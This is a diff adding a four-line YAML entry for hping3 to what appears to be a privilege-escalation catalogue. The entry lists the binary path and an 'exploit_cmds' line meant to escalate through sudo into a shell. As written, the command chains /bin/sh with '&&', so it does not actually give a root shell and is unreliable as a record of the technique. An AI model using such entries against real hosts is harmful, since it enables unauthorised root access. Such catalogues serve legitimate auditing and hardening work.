@@ -1,0 +1,4 @@
+name: hping3
+binary_path: /usr/bin/hping3
+exploit_cmds:
+- sudo /usr/bin/hping3 && /bin/sh
